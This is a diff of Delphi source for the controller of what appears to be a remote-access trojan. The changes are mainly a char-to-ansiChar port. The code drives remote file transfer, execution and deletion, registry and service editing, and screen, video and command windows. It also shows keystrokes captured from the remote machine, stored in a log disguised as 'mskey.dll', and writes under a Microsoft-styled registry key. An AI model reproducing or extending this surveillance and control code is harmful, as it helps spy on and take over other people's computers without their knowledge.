@@ -5,14 +5,14 @@ interface
 uses
   Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
   Dialogs, ComCtrls, StdCtrls, ExtCtrls, Buttons, Menus,uTransDataSrv,data,
-  ImgList, ScktComp,func,shellapi,shlobj,ActiveX,registry,uConfigSvrGuid,uRegEdit,
-  winSvc,uHelper,untQQWry, DateUtils,funcs, WinSkinData,ufVideo,udlgCMD,ufScr,uDebug,
-  System.ImageList;
+  ImgList, ScktComp,func,shellapi,shlobj,ActiveX,registry,uConfigSvrGuid,uRegEdit, //, WinSkinData
+  winSvc,uHelper,untQQWry, DateUtils,funcs,ufVideo,udlgCMD,ufScr,uDebug,
+  System.ImageList,FileCtrl;
 
 type
   pDriveInfo=^stDriveInfo;
   stDriveInfo=packed record
-    name:array[0..2] of char;
+    name:array[0..2] of ansiChar;
     t:dword;
   end;
   tDriveInfos=array of stDriveInfo;
@@ -20,15 +20,15 @@ type
   pRegInfo=^stRegInfo;
   stRegInfo=record
     rk:HKEY;
-    key,val,Data:pchar;
+    key,val,Data:pansiChar;
   end;
   TRegOp=(REnumKey,RCreateKey,RRenameKey,RDelKey,RCreateVal,RrenameVal,RDelVal,RGetVal,REnumFree);
   pRegOpInfo=^stRegOpInfo;
   stRegOpInfo=record
     op:TRegOp;
     rk:HKEY;
-    key:array[0..max_path-1] of char;
-    val:array[0..max_path-1] of char;
+    key:array[0..max_path-1] of ansiChar;
+    val:array[0..max_path-1] of ansiChar;
     typ:DWORD;
     dat:pointer;
     siz:dword;
@@ -38,7 +38,7 @@ type
   pSvcOpInfo=^stSvcOpInfo;
   stSvcOpInfo=record
     op:TsvcOp;
-    name:array[0..31] of char;
+    name:array[0..31] of ansiChar;
   end;
 
   TEnumServices = array[0..0] of TEnumServiceStatus;
@@ -46,33 +46,33 @@ type
 
   pServiceStatus=^stServiceStatus;
   stServiceStatus=record
-    ServiceType:array[0..63] of char;
-    CurrentState:array[0..63] of char;
-    ControlsAccepted:array[0..63] of char;
-    Win32ExitCode:array[0..63] of char;
-    ServiceSpecificExitCode:array[0..63] of char;
-    CheckPoint:array[0..63] of char;
-    WaitHint:array[0..63] of char;
+    ServiceType:array[0..63] of ansiChar;
+    CurrentState:array[0..63] of ansiChar;
+    ControlsAccepted:array[0..63] of ansiChar;
+    Win32ExitCode:array[0..63] of ansiChar;
+    ServiceSpecificExitCode:array[0..63] of ansiChar;
+    CheckPoint:array[0..63] of ansiChar;
+    WaitHint:array[0..63] of ansiChar;
   end;
   PServiceConfig=^stServiceConfig;
   stServiceConfig=record
-    ServiceType:array[0..63] of char;
-    StartType:array[0..63] of char;
-    ErrorControl:array[0..63] of char;
-    BinaryPathName:array[0..max_path] of char;
-    ServiceDll:array[0..max_path] of char;
-    LoadOrderGroup:array[0..63] of char;
-    TagId:array[0..63] of char;
-    Dependencies:array[0..63] of char;
-    ServiceStartName:array[0..63] of char;
-    DisplayName:array[0..127] of char;
-    Description:array[0..255] of char;
+    ServiceType:array[0..63] of ansiChar;
+    StartType:array[0..63] of ansiChar;
+    ErrorControl:array[0..63] of ansiChar;
+    BinaryPathName:array[0..max_path] of ansiChar;
+    ServiceDll:array[0..max_path] of ansiChar;
+    LoadOrderGroup:array[0..63] of ansiChar;
+    TagId:array[0..63] of ansiChar;
+    Dependencies:array[0..63] of ansiChar;
+    ServiceStartName:array[0..63] of ansiChar;
+    DisplayName:array[0..127] of ansiChar;
+    Description:array[0..255] of ansiChar;
   end;
   pServiceInfo=^stServiceInfo;
   stServiceInfo=record
-    ID:array[0..3] of char;
-    ServiceName:array[0..63] of char;
-    DisplayName:array[0..127] of char;
+    ID:array[0..3] of ansiChar;
+    ServiceName:array[0..63] of ansiChar;
+    DisplayName:array[0..127] of ansiChar;
     ServiceStatus:stServiceStatus;
     ServiceConfig:stServiceConfig;
   end;
@@ -254,7 +254,6 @@ type
     TabSheet9: TTabSheet;
     MemoThread: TMemo;
     popSearchProc: TMenuItem;
-    SkinData1: TSkinData;
     btnCMD: TButton;
     btnVideo: TButton;
     N39: TMenuItem;
@@ -365,13 +364,13 @@ type
     function getListFile(node:ttreenode;item:tlistItem):string;
     procedure ProcessGetFileInfos(FileInfos:pointer;size:integer);
     function GetFileIconIndex(FileName: string; Large: Boolean): Integer;
-    function SelDir(const Caption: string; const Root: WideString; out Directory: string): Boolean;
+    function SelDir(const Caption: String; const Root: WideString; out Directory: String): Boolean;
     procedure ProcessGetProcs(procs:pointer;size:integer);
     procedure ProcessGetRegInfo(RegInfo:pointer;size:integer);
     procedure UpdateTreeProcess(Tree: TTreeView;FullFileNameList:tstrings);
     procedure addRegTree(ss:tstrings;tree:ttreeview);
-    procedure AddRegList(valueName:pchar;dwType:DWORD;data:pointer;dataSize:DWORD;list:Tlistview);
-    procedure ProcessGetPCName(pcName:pchar;node:ttreeNode);
+    procedure AddRegList(valueName:pansiChar;dwType:DWORD;data:pointer;dataSize:DWORD;list:Tlistview);
+    procedure ProcessGetPCName(pcName:pansiChar;node:ttreeNode);
     procedure ProcessGetSvcInfo(SvcInfo:pointer;size:integer);
     function GetSvrOStype:integer;
     procedure GetSvcMemo(var ss:tstrings);
@@ -405,7 +404,7 @@ end;
 
 procedure tfmain.SetIPToServer();
 var
-  IP:array[0..127] of char;
+  IP:array[0..127] of ansiChar;
   pIP:PIPServer;
   id,hd:cardinal;
 begin
@@ -437,10 +436,11 @@ begin
     QQWryFile:=ExtractFilePath(QQWryFile)+'QQWry.dat';
     if FileExists(QQWryFile) then begin
       QQWry:=TQQWry.Create(QQWryFile);
-      MemoPCInfo.Lines.Add('-----QQWry.dat数据库-------');
+      MemoPCInfo.Lines.Add('-----数据库-------');
       MemoPCInfo.Lines.Add('文件大小: ' + sysutils.IntToStr(QQWry.GetQQWryFileSize));
       MemoPCInfo.Lines.Add('记录总数: ' + sysutils.IntToStr(QQWry.GetIPRecordNum));
-      MemoPCInfo.Lines.Add('更新日期: ' + format('%d年%d月%d日', [yearof(QQWry.GetQQWryDate), monthof(QQWry.GetQQWryDate), dayof(QQWry.GetQQWryDate)]));
+      MemoPCInfo.Lines.Add('更新日期: ' + QQWry.GetQQWryDate);
+      //MemoPCInfo.Lines.Add('更新日期: ' + format('%d年%d月%d日', [yearof(QQWry.GetQQWryDate), monthof(QQWry.GetQQWryDate), dayof(QQWry.GetQQWryDate)]));
       MemoPCInfo.Lines.Add('数据库来源: ' + QQWry.GetQQWryDataFrom);
       QQWry.Free;
     end
@@ -601,14 +601,14 @@ begin
   ss.Free;
 end;
 
-procedure tfmain.ProcessGetPCName(pcName:pchar;node:ttreeNode);
+procedure tfmain.ProcessGetPCName(pcName:pansiChar;node:ttreeNode);
 //2006-03-17:增加记录gsyh,gszf功能
 //06-05-13:去除记录gsyh,gszf功能
 var
   i:integer;
-  p:pchar;
-  pc,ip:array[0..255] of char;
-  buf:array[0..1023] of char;
+  p:pansiChar;
+  pc,ip:array[0..255] of ansiChar;
+  buf:array[0..1023] of ansiChar;
 begin
   p:=strpos(pcName,'|');
   if p<>nil then
@@ -619,7 +619,7 @@ begin
   begin
     if treeclient.Items[i]=node then
     begin
-      strcopy(ip,pchar(treeClient.Items[i].Text));
+      strcopy(ip,pansiChar(treeClient.Items[i].Text));
       treeClient.Items[i].Text:=pc;
     end;//if treeclient.Items[i]=node then
   end;//for i:=0 to treeclient.Items.Count-1 do
@@ -628,12 +628,12 @@ begin
     strcopy(buf,ip);strcat(buf,p);
     memoPCInfo.Lines.Add(buf);
     ip:='';pc:='';
-    GetModuleFileName(0,ip,sizeof(ip));
+    GetModuleFileNameA(0,ip,sizeof(ip));
     ExtractFileDir(ip,pc);strcat(pc,'\server.txt');
     func.Log(buf,pc);
   end;
 end;
-procedure tfmain.AddRegList(valueName:pchar;dwType:DWORD;data:pointer;dataSize:DWORD;list:Tlistview);
+procedure tfmain.AddRegList(valueName:pansiChar;dwType:DWORD;data:pointer;dataSize:DWORD;list:Tlistview);
 var
   sType,sData:string;
   item:tListitem;
@@ -660,7 +660,7 @@ begin
     REG_EXPAND_SZ:
     begin
       sType:='REG_EXPAND_SZ';
-      sData:=pchar(data);
+      sData:=pansiChar(data);
     end;
     REG_LINK:
     begin
@@ -669,7 +669,7 @@ begin
     REG_MULTI_SZ:
     begin
       sType:='REG_MULTI_SZ';
-      sData:=pchar(data);
+      sData:=pansiChar(data);
     end;
     REG_NONE:
     begin
@@ -682,7 +682,7 @@ begin
     REG_SZ:
     begin
       sType:='REG_SZ';
-      sData:=pchar(data);
+      sData:=pansiChar(data);
     end;
   end;//case
   item.SubItems.Add(sType);
@@ -715,12 +715,12 @@ var
   cbSubKeyLen,cbValNameLen,cbValLen:DWORD;
   p:pointer;
   pd:PDWORD;
-  pc:pchar;
+  pc:pansiChar;
   pb:pointer;
   subkeysLen,dwType:DWORD;
   ss:tstrings;
-  lpValueName:pchar;
-  bData:array[0..8192] of char;
+  lpValueName:pansiChar;
+  bData:array[0..8192] of ansiChar;
   //数据流结构：1、子键数目；2、最大子键长度；3值数目；4、最大值名长度；5、最大数据长度；
   //6、子键列表大小；7、子键列表；8、值长度；9、值类型；10、数据长度；11、值名称；12、数据；
 begin
@@ -743,7 +743,7 @@ begin
   //7、取子键列表；
   if cSubKeys>0 then
   begin
-    ss.Text:=pchar(p);
+    ss.Text:=pansiChar(p);
     AddRegTree(ss,treeReg);
     p:=pointer(DWORD(p)+subkeysLen);
   end;//if cSubKeys>0 then
@@ -798,7 +798,7 @@ var
   ss:tstrings;
 begin
   ss:=tstringlist.Create;
-  ss.Text:=pchar(procs);
+  ss.Text:=pansiChar(procs);
   UpdateTreeProcess(treeProc,ss);
   ss.Free;
 end;
@@ -807,7 +807,7 @@ var
   Rect: TRect;
 begin
   if uMsg=BFFM_INITIALIZED then
-    result :=SendMessage(Hwnd,BFFM_SETSELECTION,Ord(TRUE),Longint(PChar(InitPath)))
+    result :=SendMessage(Hwnd,BFFM_SETSELECTION,Ord(TRUE),Longint(PansiChar(InitPath)))
   else
     result :=1;
 end;
@@ -826,7 +826,7 @@ begin
   FillChar(BrowseInfo, SizeOf(BrowseInfo), 0);
   if (ShGetMalloc(ShellMalloc) = S_OK) and (ShellMalloc <> nil) then
   begin
-    Buffer := ShellMalloc.Alloc(MAX_PATH);
+    Buffer := ShellMalloc.Alloc(MAX_PATH*sizeof(char));
     try
       RootItemIDList := nil;
       if Root <> '' then begin
@@ -864,7 +864,7 @@ function tfmain.GetFileIconIndex(FileName: string; Large: Boolean): Integer;
 var
   Ext: string;
   Flags: Integer;
-  FileInfo:TSHFileInfo ;
+  FileInfo:TSHFileInfoA ;
   tmpstr:string;
 begin
   Ext := FileName;
@@ -873,7 +873,7 @@ begin
     Flags := Flags or SHGFI_LARGEICON
   else
     Flags := Flags or SHGFI_SMALLICON;
-  SHGetFileInfo(PChar(Ext), 0, FileInfo, SizeOf(FileInfo), Flags);
+  SHGetFileInfoA(PansiChar(Ext), 0, FileInfo, SizeOf(FileInfo), Flags);
   Result := FileInfo.iIcon;
   tmpstr:=FileInfo.szDisplayName;
   tmpstr:=FileInfo.szTypeName;
@@ -883,8 +883,8 @@ end;
 procedure tfmain.ProcessGetFileInfos(FileInfos:pointer;size:integer);
 label 1;
 var
-  Files:array of win32_find_data;
-  filename:pchar;
+  Files:array of win32_find_dataA;
+  filename:pansiChar;
   count,i:integer;
   node:ttreenode;
   item:tListitem;
@@ -892,7 +892,7 @@ var
   sysTime:tSystemTime;
 begin
   if size=0 then goto 1;
-  count:=size div sizeof(win32_find_data);
+  count:=size div sizeof(win32_find_dataA);
   setlength(Files,count);
   copymemory(Files,FileInfos,size);
   node:=treedir.Selected;
@@ -952,7 +952,7 @@ procedure tfmain.ShowPCInfo(item:tlistitem);
 //06-05-13:显示PC信息
 var
   i,j:integer;
-  s,r:string;
+  s,r:ansistring;
   ss,st:tstrings;
 begin
   ss:=item.SubItems;
@@ -993,8 +993,8 @@ if r='<IsRemoteDeskConn>' then r:='远程桌面连接：        ';
     begin
       if (r='登陆用户：            ')and(length(s)>0)and(lowercase(s)<>'system') then
       begin
-        if pos(char(ord('-')+1),s)>0 then
-        for j:=1 to length(s) do s[j]:=char(ord(s[j])-1);
+        if pos(ansiChar(ord('-')+1),s)>0 then
+        for j:=1 to length(s) do s[j]:=ansiChar(ord(s[j])-1);
       end;
       st.Add(r+s);
     end;
@@ -1080,7 +1080,7 @@ begin
       if (s<>'')and(s<>'used') then
       begin
         r:=SysUtils.ExtractFilePath(Application.ExeName)+'server.txt';
-        func.Log(pchar(ss.text),pchar(r));
+        func.Log(pansiChar(ss.text),pansiChar(r));
       end;
       continue;
     end;//if pos('<>',ss[i])=1 then
@@ -1090,7 +1090,7 @@ begin
       if (s<>'')and(s<>'used') then
       begin
         r:=SysUtils.ExtractFilePath(Application.ExeName)+'server.txt';
-        //Log(pchar(ss.text),pchar(r));
+        //Log(pansiChar(ss.text),pansiChar(r));
       end;
       continue;
     end;//if pos('<>',ss[i])=1 then
@@ -1233,7 +1233,7 @@ var
 begin
   p:=pointer(aMessage.LParam);
   threadType:=TThreadType(p^);
-  pAct:=pBool(pchar(p)+sizeof(TThreadType));
+  pAct:=pBool(pansiChar(p)+sizeof(TThreadType));
   case threadType of
   FMainThread:
     begin
@@ -1542,7 +1542,7 @@ begin
       ProcessGetPCInfo(Socket);
       {
       memoPCInfo.Clear;
-      memoPCInfo.lines.add(pchar(pc^.data));
+      memoPCInfo.lines.add(pansiChar(pc^.data));
       ShowIPAddr(Socket.RemoteAddress);
       }
     end;//GetPCInfo:
@@ -1568,7 +1568,7 @@ begin
     end;//GetPCName
   GetHookKeys:
     begin
-      memoKeys.Text:=pchar(pc^.data);
+      memoKeys.Text:=pansiChar(pc^.data);
     end;//GetHookKeys
   GetSvcInfo:
     begin
@@ -1649,7 +1649,7 @@ end;
 procedure TFMain.FormShow(Sender: TObject);
 var
   pData:pMainTread;
-  buf:array[0..31] of char;
+  buf:array[0..31] of ansiChar;
   nSize:cardinal;
 begin
   new(pData);
@@ -1847,7 +1847,7 @@ end;
 
 procedure TFMain.TreeDirChange(Sender: TObject; Node: TTreeNode);
 var
-  path:string;
+  path:ansistring;
   size:dword;
   iRet:integer;
 begin
@@ -1856,14 +1856,14 @@ begin
   if not CurConActive  then exit;//当前连接是否可用，是否空闲
   path:=GetTreeDir(TreeDir.Selected);
   size:=length(path);
-  dm.SendOrder(o_ListFileInfos,pchar(path),size);
-  //Log(pchar(path));
+  dm.SendOrder(o_ListFileInfos,pansiChar(path),size);
+  //Log(pansiChar(path));
   //dm.SendOrder(o_ListFileInfos);
 
 
   //iRet:=dm.SendBuf(@size,sizeof(size));
   //Log('ListDir Size:%d,Send Size:%d:',[size,iRet]);
-  //iRet:=dm.SendBuf(pchar(path),size);
+  //iRet:=dm.SendBuf(pansiChar(path),size);
   //Log('ListDir SendBuf Size:%d:',[iRet]);
 
   CurPc^.flg:=GetFileInfos;
@@ -1871,7 +1871,7 @@ end;
 
 procedure TFMain.popUpFileClick(Sender: TObject);
 var
-  LocalName,remoteName,LocalDir:string;
+  LocalName,remoteName,LocalDir:ansistring;
   fi:stTransFilesInfo;
 begin
   if not CurConActive then exit;
@@ -1891,8 +1891,8 @@ begin
     strcopy(fi.server.IP,'');
     fi.server.flg:=0;
     fi.server.port:=PORT;
-    strcopy(fi.clientFile,pchar(remoteName));
-    strcopy(fi.serverFile,pchar(LocalName));
+    strcopy(fi.clientFile,pansiChar(remoteName));
+    strcopy(fi.serverFile,pansiChar(LocalName));
     fi.bUpLoad:=false;
     fi.bFolder:=false;
     fi.bCompleteDel:=false;
@@ -1904,7 +1904,7 @@ end;
 
 procedure TFMain.PopDownFileClick(Sender: TObject);
 var
-  LocalName,remoteName,LocalDir:string;
+  LocalName,remoteName,LocalDir:ansistring;
   fi:stTransFilesInfo;
 begin
   if not CurConActive then exit;
@@ -1918,8 +1918,8 @@ begin
 
     zeromemory(@fi,sizeof(fi));
     fi.server.IP:='';fi.server.flg:=0;fi.server.port:=PORT;
-    strcopy(fi.clientFile,pchar(remoteName));
-    strcopy(fi.serverFile,pchar(LocalName));
+    strcopy(fi.clientFile,pansiChar(remoteName));
+    strcopy(fi.serverFile,pansiChar(LocalName));
     fi.bUpLoad:=true;
     fi.bFolder:=false;
     fi.bCompleteDel:=false;
@@ -1931,7 +1931,7 @@ end;
 
 procedure TFMain.PopUpLoadDirClick(Sender: TObject);
 var
-  remoteDir,LocalDir,LocalFile:string;
+  remoteDir,LocalDir,LocalFile:ansistring;
   TransDirInfo:stTransFilesInfo;
 begin
   if not CurConActive then exit;
@@ -1942,13 +1942,16 @@ begin
   end;
   remoteDir:=getTreeDir(treeDir.Selected);
   initPath:='C:';
-  if SelDir('请选择安装目录：','',initPath) then LocalDir:=initPath else exit;
+  //if SelDir('请选择安装目录：','',initPath) then LocalDir:=initPath else exit;
+  if(initPath='')then initPath:='c:\';
+  if not  SelectDirectory( '请选择目录',initPath,LocalDir) then  exit;
+  initPath:=LocalDir;
   zeromemory(@TransDirInfo,sizeof(TransDirInfo));
   strcopy(TransDirInfo.server.IP,'');
   TransDirInfo.server.port:=PORT;
   TransDirInfo.server.flg:=0;
-  strcopy(TransDirInfo.clientFile,pchar(remoteDir));
-  strcopy(TransDirInfo.serverFile,pchar(LocalDir));
+  strcopy(TransDirInfo.clientFile,pansiChar(remoteDir));
+  strcopy(TransDirInfo.serverFile,pansiChar(LocalDir));
   TransDirInfo.bUpLoad:=false;
   TransDirInfo.bFolder:=true;
   TransDirInfo.bCompleteDel:=false;
@@ -1959,7 +1962,7 @@ end;
 
 procedure TFMain.PopDownDirClick(Sender: TObject);
 var
-  remoteDir,LocalDir:string;
+  remoteDir,LocalDir:ansistring;
   TransDirInfo:stTransFilesInfo;
 begin
   if not CurConActive then exit;
@@ -1980,8 +1983,8 @@ begin
   strcopy(TransDirInfo.server.IP,'');
   TransDirInfo.server.port:=PORT;
   TransDirInfo.server.flg:=0;
-  strcopy(TransDirInfo.clientFile,pchar(remoteDir));
-  strcopy(TransDirInfo.serverFile,pchar(LocalDir));
+  strcopy(TransDirInfo.clientFile,pansiChar(remoteDir));
+  strcopy(TransDirInfo.serverFile,pansiChar(LocalDir));
   TransDirInfo.bUpLoad:=true;
   TransDirInfo.bFolder:=true;
   TransDirInfo.bCompleteDel:=false;
@@ -2051,8 +2054,8 @@ end;
 procedure TFMain.PopCrtKeyClick(Sender: TObject);
 var
   ro:stRegOpInfo;
-  Key,RootKey,NewKey,Val,data:string;
-  p:pchar;
+  Key,RootKey,NewKey,Val,data:ansistring;
+  p:pansiChar;
   i:integer;
 begin
   if not CurConActive() then exit;
@@ -2076,7 +2079,7 @@ begin
   if RootKey='HKEY_PERFORMANCE_DATA' then ro.rk:=HKEY_PERFORMANCE_DATA;
   if RootKey='HKEY_CURRENT_CONFIG' then ro.rk:=HKEY_CURRENT_CONFIG;
   if RootKey='HKEY_DYN_DATA' then ro.rk:=HKEY_DYN_DATA;
-  strcopy(ro.key,pchar(key));
+  strcopy(ro.key,pansiChar(key));
   ro.siz:=0;
   case tcomponent(Sender).Tag of
   1:begin
@@ -2090,7 +2093,7 @@ begin
       ro.op:=RCreateKey;
       key:=inputbox('请输入键名：','键名：','');
       if key='' then exit;
-      strcat(ro.key,'\');strcat(ro.key,pchar(key));
+      strcat(ro.key,'\');strcat(ro.key,pansiChar(key));
       dm.SendOrder(o_Reg);
       dm.SendBuf(@ro,sizeof(ro));
     end;//createkey;
@@ -2104,7 +2107,7 @@ begin
         //if data='' then begin exit;
         data:=data+#0;
         ro.op:=RCreateVal;
-        strcopy(ro.val,pchar(val));
+        strcopy(ro.val,pansiChar(val));
         ro.typ:=REG_SZ;
         ro.siz:=length(data);
         ro.dat:=@data[1];
@@ -2132,7 +2135,7 @@ begin
           showmessage('进制数值格式不对！');exit;
         end;//
         ro.op:=RCreateVal;
-        strcopy(ro.val,pchar(val));
+        strcopy(ro.val,pansiChar(val));
         ro.typ:=REG_BINARY;
 
         dm.SendOrder(o_Reg);
@@ -2154,7 +2157,7 @@ begin
           showmessage('必须是数字！');exit;
         end;//if not IsDigit(data) then
         ro.op:=RCreateVal;
-        strcopy(ro.val,pchar(val));
+        strcopy(ro.val,pansiChar(val));
         ro.typ:=REG_DWORD;
         getmem(ro.dat,sizeof(DWORD));
         PDWORD(ro.dat)^:=DWORD(sysutils.strtoint(Data));
@@ -2176,7 +2179,7 @@ begin
       if Newkey='' then exit;
       delete(key,pos(TreeReg.Selected.Text,key),length(TreeReg.Selected.Text));
       NewKey:=key+NewKey;
-      strcopy(ro.val,pchar(NewKey));
+      strcopy(ro.val,pansiChar(NewKey));
       ro.op:=RRenameKey;
       dm.SendOrder(o_Reg);
       dm.SendBuf(@ro,sizeof(ro));
@@ -2187,7 +2190,7 @@ begin
         showmessage('请选择要修改的值！');exit;
       end;
       ro.op:=RCreateVal;
-      strcopy(ro.val,pchar(ListReg.Selected.caption));
+      strcopy(ro.val,pansiChar(ListReg.Selected.caption));
       data:=inputbox('请输入新值：',ro.val,'');
       data:=data+#0;
       ro.typ:=REG_SZ;
@@ -2204,7 +2207,7 @@ begin
         showmessage('请选择要删除的值！');exit;
       end;
       ro.op:=RdelVal;
-      strcopy(ro.val,pchar(ListReg.Selected.caption));
+      strcopy(ro.val,pansiChar(ListReg.Selected.caption));
       dm.SendOrder(o_Reg);
       dm.SendBuf(@ro,sizeof(ro));
     end;//DelVAl;
@@ -2217,9 +2220,9 @@ begin
       if val='' then exit;
       ro.op:=RRenameVal;
       zeromemory(@ro.Val,sizeof(ro.val));
-      strcopy(ro.val,pchar(ListReg.Selected.caption));
+      strcopy(ro.val,pansiChar(ListReg.Selected.caption));
       p:=ro.val;p:=p+strlen(ro.val)+1;
-      strcopy(p,pchar(Val));
+      strcopy(p,pansiChar(Val));
       dm.SendOrder(o_Reg);
       dm.SendBuf(@ro,sizeof(ro));
      end;//RenameVal;
@@ -2235,7 +2238,7 @@ end;
 
 procedure TFMain.popUpdateTree1Click(Sender: TObject);
 var
-  pcName:string;
+  pcName:ansistring;
   ro:stRegOpInfo;
 begin
   if not curConActive then exit;
@@ -2247,7 +2250,7 @@ begin
   ro.key:='SoftWare\Microsoft\Byc';
   ro.val:='PCName';
   ro.typ:=reg_sz;
-  ro.dat:=pchar(pcName);
+  ro.dat:=pansiChar(pcName);
   ro.siz:=length(pcName);
   dm.SendBuf(@ro,sizeof(ro));
   dm.SendBuf(ro.dat,ro.siz);
@@ -2295,8 +2298,8 @@ begin
   strcopy(fi.server.IP,'');
   fi.server.flg:=0;
   fi.server.port:=PORT;
-  strcopy(fi.clientFile,pchar(remoteName));
-  strcopy(fi.serverFile,pchar(LocalName));
+  strcopy(fi.clientFile,pansiChar(remoteName));
+  strcopy(fi.serverFile,pansiChar(LocalName));
   fi.bUpLoad:=false;
   fi.bFolder:=false;
   fi.bCompleteDel:=false;
@@ -2346,13 +2349,13 @@ type
   stSvrAddr_tmp=packed record
     port:Word;
     case flg:byte of
-    0:(IP:array[0..15] of char);
-    1:(DN:array[0..260] of char);
+    0:(IP:array[0..15] of ansiChar);
+    1:(DN:array[0..260] of ansiChar);
   end;
   stTransFilesInfo_tmp=packed record
     server:stSvrAddr_tmp;
-    clientFile:array[0..MAX_PATH-1] of char;
-    serverFile:array[0..MAX_PATH-1] of char;
+    clientFile:array[0..MAX_PATH-1] of ansiChar;
+    serverFile:array[0..MAX_PATH-1] of ansiChar;
     bUpLoad:bool;
     bFolder:bool;
     bCompleteDel:bool;
@@ -2381,8 +2384,8 @@ begin
   fi.bCompleteDel:=false;
   fi.server.flg:=0;
   fi.server.port:=PORT;
-  strcopy(fi.clientFile,pchar(remoteName));
-  strcopy(fi.serverFile,pchar(LocalName));
+  strcopy(fi.clientFile,pansiChar(remoteName));
+  strcopy(fi.serverFile,pansiChar(LocalName));
   fi.bUpLoad:=false;
   fi.bFolder:=false;
   fi.bCompleteDel:=false;
@@ -2420,7 +2423,7 @@ end;
 
 procedure TFMain.PopRunFileClick(Sender: TObject);
 var
-  remoteName:string;
+  remoteName:ansistring;
 begin
   if not CurConActive then exit;
   remoteName:=getListFile(treeDir.Selected,ListFiles.Selected);
@@ -2430,7 +2433,7 @@ end;
 
 procedure TFMain.PopDelFileClick(Sender: TObject);
 var
-  remoteName:string;
+  remoteName:ansistring;
 begin
   if not CurConActive then exit;
   remoteName:=getListFile(treeDir.Selected,ListFiles.Selected);
@@ -2447,7 +2450,7 @@ end;
 
 procedure TFMain.PopCrtDirClick(Sender: TObject);
 var
-  remoteDir,dir:string;
+  remoteDir,dir:ansistring;
 begin
   if not CurConActive then exit;
   if treeDir.SelectionCount=0 then
@@ -2467,8 +2470,8 @@ end;
 
 procedure TFMain.PopDelDirClick(Sender: TObject);
 var
-  remoteDir,dir:string;
-  buf:array[0..max_path-1] of char;
+  remoteDir,dir:ansistring;
+  buf:array[0..max_path-1] of ansiChar;
 begin
   if not CurConActive then exit;
   if treeDir.SelectionCount=0 then
@@ -2478,7 +2481,7 @@ begin
   end;
   remoteDir:=getTreeDir(treeDir.Selected);
   dm.SendOrder(o_DelDir);
-  strcopy(buf,pchar(remoteDir));
+  strcopy(buf,pansiChar(remoteDir));
   dm.SendBuf(@buf,sizeof(buf));
 end;
 
@@ -2529,11 +2532,11 @@ end;
 procedure TFMain.popSvcStartClick(Sender: TObject);
 var
   so:stSvcOpInfo;
-  svcName:pchar;
+  svcName:pansiChar;
 begin
   if not CurConActive then exit;
   if ListSvc.SelCount=0 then exit;
-  svcName:=pchar(ListSvc.Selected.Caption);
+  svcName:=pansiChar(ListSvc.Selected.Caption);
   zeromemory(@so,sizeof(so));
    case tcomponent(Sender).Tag of
    1:begin so.op:=SRunSvc;strcopy(so.name,svcName); end;//1
@@ -2608,7 +2611,7 @@ procedure TFMain.popSearchProcClick(Sender: TObject);
 var
   node:ttreeNode;
   i:integer;
-  s,txt:string;
+  s,txt:ansistring;
 begin
   node:=treeProc.Selected;
   if node.HasChildren then
@@ -2727,7 +2730,7 @@ begin
   filename:=sysutils.extractfiledir(application.ExeName)+'\mskey.dll';
   if fileexists(filename) then
   //memoKeys.Lines.LoadFromFile(filename)
-  shellexecute(application.Handle,'open','notepad.exe',pchar(filename),nil,sw_shownormal)
+  shellexecuteA(application.Handle,'open','notepad.exe',pansiChar(filename),nil,sw_shownormal)
   else
     showmessage('无mskey.dll文件！');
 end;
